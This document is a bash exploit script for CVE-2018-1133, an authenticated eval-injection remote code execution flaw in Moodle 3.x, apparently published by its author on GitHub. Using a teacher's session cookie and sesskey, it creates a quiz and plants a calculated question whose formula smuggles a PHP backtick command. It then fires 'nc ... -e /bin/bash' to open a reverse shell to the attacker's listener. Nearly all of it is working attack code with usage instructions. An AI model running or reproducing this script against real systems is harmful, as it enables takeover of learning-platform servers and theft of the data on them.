##!/bin/bash

echo -e "\n\e[00;33m[+]#################################################################################################################[+] \e[00m"
echo -e "\e[00;32m[*] MOODLE 3.X RCE script by M4LV0                                                                                  [*] \e[00m"
echo -e "\e[00;33m[+]#################################################################################################################[+] \e[00m"
echo -e "\e[00;32m[*] https://github.com/M4LV0                                                                                        [*] \e[00m"
echo -e "\e[00;33m[+]#################################################################################################################[+] \e[00m"
echo -e "\e[00;32m[*] Authenticated as teacher moodle remote code execution by way of eval injection CVE-2018-1133                    [*] \e[00m"
echo -e "\e[00;33m[+]#################################################################################################################[+] \e[00m"
echo -e "\n\e[00;32m# login to moodle. Once athenticated grab your cookie and sesskey. if you cant do that give up...\n# once you have both cookie and sesskey you can run the exploit script. make sure to start a listener on your chosen port..\n# this script is using nc for the reverse shell so you may want to take a look at that if your not getting a shell. anyway have fun...  \e[00m\n"
echo -e "\e[00;33m[+]#################################################################################################################[+] \e[00m"


usage()
{
echo -e '\e[00;35m EXAMPLE USAGE:\e[00m\e[00;32m ./pwnmoodle.sh -u http://10.10.10.10 -c "MoodleSession=6sgoigl06c1u3l3etam26fr061" -s VhQgGeqK1T -l 10.10.14.11 -p 4444 \e[00m\n'
echo -e "\e[00;32m[*] ./pwnmoodle.sh -u <url> -c <moodlesessioncookie enclosed in quotes> -s <sessionkey> -l <your local host ip> -p <local listening port> ....\n[*] keep the format of the arguemnets the same as I have and it'll run fine \e[00m"
}



test_cookie()
{
one=$(curl -i --cookie $cookie $url/moodle/my/ -w '%{http_code}' -o /dev/null -s)
if [ $one -eq 200 ]; then
echo -e "\e[00;32m[*] cookie value good we can continue...\e[00m"
else
echo -e "\e[00;31m[*] cookie value bad your an idiot... STOP!\e[00m"
exit 1
fi
}

create_hacked()
{
hacked=$(curl --silent --write-out "HTTPSTATUS:%{http_code}" -X POST --data '[{"index":0,"methodname":"core_update_inplace_editable","args":{"itemid":"2","component":"format_topics","itemtype":"sectionname","value":"hacked"}}]' --cookie $cookie $url/moodle/lib/ajax/service.php?sesskey=$sesskey&info=core_update_inplace_editable)
hacked_status=$(echo "$hacked" | grep -o 200)
if [[ $hacked_status -eq 200 ]]; then
echo -e "\e[00;32m[*] boom... we created topic hacked....\e[00m"
else
echo -e "\e[00;31m[*] what are you doing stupid youve fucked it again!\e[00m"
exit 1
fi
}


create_hacked_quizz()
{
quizz_data="grade=10&boundary_repeats=1&completionunlocked=1&course=2&coursemodule=&section=1&module=16&modulename=quiz&instance=&add=quiz&update=0&return=0&sr=0&sesskey="$sesskey"&_qf__mod_quiz_mod_form=1&mform_showmore_id_layouthdr=0&mform_showmore_id_interactionhdr=0&mform_showmore_id_display=0&mform_showmore_id_security=0&mform_isexpanded_id_general=1&mform_isexpanded_id_timing=0&mform_isexpanded_id_modstandardgrade=0&mform_isexpanded_id_layouthdr=0&mform_isexpanded_id_interactionhdr=0&mform_isexpanded_id_reviewoptionshdr=0&mform_isexpanded_id_display=0&mform_isexpanded_id_security=0&mform_isexpanded_id_overallfeedbackhdr=0&mform_isexpanded_id_modstandardelshdr=0&mform_isexpanded_id_availabilityconditionsheader=0&mform_isexpanded_id_activitycompletionheader=0&mform_isexpanded_id_tagshdr=0&mform_isexpanded_id_competenciessection=0&name=hacked+quizz&introeditor%5Btext%5D=&introeditor%5Bformat%5D=1&introeditor%5Bitemid%5D=294221251&showdescription=0&overduehandling=autosubmit&gradecat=1&gradepass=&attempts=0&grademethod=1&questionsperpage=1&navmethod=free&shuffleanswers=1&preferredbehaviour=deferredfeedback&attemptonlast=0&attemptimmediately=1&correctnessimmediately=1&marksimmediately=1&specificfeedbackimmediately=1&generalfeedbackimmediately=1&rightanswerimmediately=1&overallfeedbackimmediately=1&attemptopen=1&correctnessopen=1&marksopen=1&specificfeedbackopen=1&generalfeedbackopen=1&rightansweropen=1&overallfeedbackopen=1&showuserpicture=0&decimalpoints=2&questiondecimalpoints=-1&showblocks=0&quizpassword=&subnet=&browsersecurity=-&feedbacktext%5B0%5D%5Btext%5D=&feedbacktext%5B0%5D%5Bformat%5D=1&feedbacktext%5B0%5D%5Bitemid%5D=755967831&feedbackboundaries%5B0%5D=&feedbacktext%5B1%5D%5Btext%5D=&feedbacktext%5B1%5D%5Bformat%5D=1&feedbacktext%5B1%5D%5Bitemid%5D=846827992&visible=1&cmidnumber=&groupmode=0&availabilityconditionsjson=%7B%22op%22%3A%22%26%22%2C%22c%22%3A%5B%5D%2C%22showc%22%3A%5B%5D%7D&completion=1&tags=_qf__force_multiselect_submission&competency_rule=0&submitbutton=Save+and+display"
hacked_quizz=$(curl -L --silent --write-out "HTTPSTATUS:%{http_code}" -X POST --data $quizz_data --cookie $cookie $url/moodle/course/modedit.php)
hacked_status1=$(echo "$hacked_quizz" | grep -o cmid='[0-9]*'| sed 's/[^0-9]*//g' | tail -1)
cmid=$hacked_status1
echo -e "\e[00;32m[*] we have created hacked_quizz with cmid: $cmid \e[00m"
echo -e "\e[00;32m[*] making exploit....\e[00m"
}

make_exploit()
{
exploit_data="initialcategory=1&reload=1&shuffleanswers=1&answernumbering=abc&mform_isexpanded_id_answerhdr=1&noanswers=1&nounits=1&numhints=2&synchronize=&wizard=datasetdefinitions&id=&inpopup=0&cmid="$cmid"&courseid=2&returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D"$cmid"%26addonpage%3D0&scrollpos=0&appendqnumstring=addquestion&qtype=calculated&makecopy=0&sesskey="$sesskey"&_qf__qtype_calculated_edit_form=1&mform_isexpanded_id_generalheader=1&mform_isexpanded_id_unithandling=0&mform_isexpanded_id_unithdr=0&mform_isexpanded_id_multitriesheader=0&mform_isexpanded_id_tagsheader=0&category=2%2C23&name=hacked&questiontext%5Btext%5D=hacked%3Cp%3E%3Cbr%3E%3C%2Fp%3E&questiontext%5Bformat%5D=1&questiontext%5Bitemid%5D=947699938&defaultmark=1&generalfeedback%5Btext%5D=&generalfeedback%5Bformat%5D=1&generalfeedback%5Bitemid%5D=96245721&answer%5B0%5D=%2F*%7Bx%7D%7Ba*%2F%60%24_GET%5Bcmd%5D%60%2F*%281%29%2F%2F%7D%7Ba*%2F%60%24_GET%5Bcmd%5D%60%2F*%28%7Bx%7D%29%2F%2F%7D*%2F&fraction%5B0%5D=1.0&tolerance%5B0%5D=0.01&tolerancetype%5B0%5D=1&correctanswerlength%5B0%5D=2&correctanswerformat%5B0%5D=1&feedback%5B0%5D%5Btext%5D=&feedback%5B0%5D%5Bformat%5D=1&feedback%5B0%5D%5Bitemid%5D=827340697&unitrole=3&penalty=0.3333333&hint%5B0%5D%5Btext%5D=&hint%5B0%5D%5Bformat%5D=1&hint%5B0%5D%5Bitemid%5D=250680322&hint%5B1%5D%5Btext%5D=&hint%5B1%5D%5Bformat%5D=1&hint%5B1%5D%5Bitemid%5D=362977881&tags=_qf__force_multiselect_submission&submitbutton=Save+changes"
exploit_gen=$(curl -L --silent --write-out "HTTPSTATUS:%{http_code}" -X POST --data $exploit_data --cookie $cookie $url/moodle/question/question.php)
exploit_status=$(echo "$exploit_gen" | grep -o 200)
if [[ $exploit_status -eq 200 ]]; then
echo -e "\e[00;32m[*] exploit successfully created... hope you have your nc listener ready....\e[00m"
else
echo -e "\e[00;31m[*] give up.... find a new hobby.... there must be something else in life your good at? \e[00m"
fi
}

exploit()
{
echo -e "\e[00;32m[*] prepare for incoming shell!!!\e[00m"
ex=$(curl -L -s --cookie $cookie "$url/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid=$cmid%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=9&wizardnow=datasetitems&cmid=$cmid&cmd=nc%20$lhost%20$lport%20-e%20/bin/bash")
}

if [[ $# -eq 0 ]] ; then
    usage
    exit 0
fi

while getopts "hu:c:s:l:p:" option; do
 case "${option}" in
    c) cookie=${OPTARG};;
    s) sesskey=${OPTARG};;
    l) lhost=${OPTARG};;
    p) lport=${OPTARG};;
    h) usage;;
    u) url=${OPTARG};;
    *) usage; exit;;
  esac
done

test_cookie
sleep 1
create_hacked
sleep 2
create_hacked_quizz
sleep 2
make_exploit
sleep 2
exploit
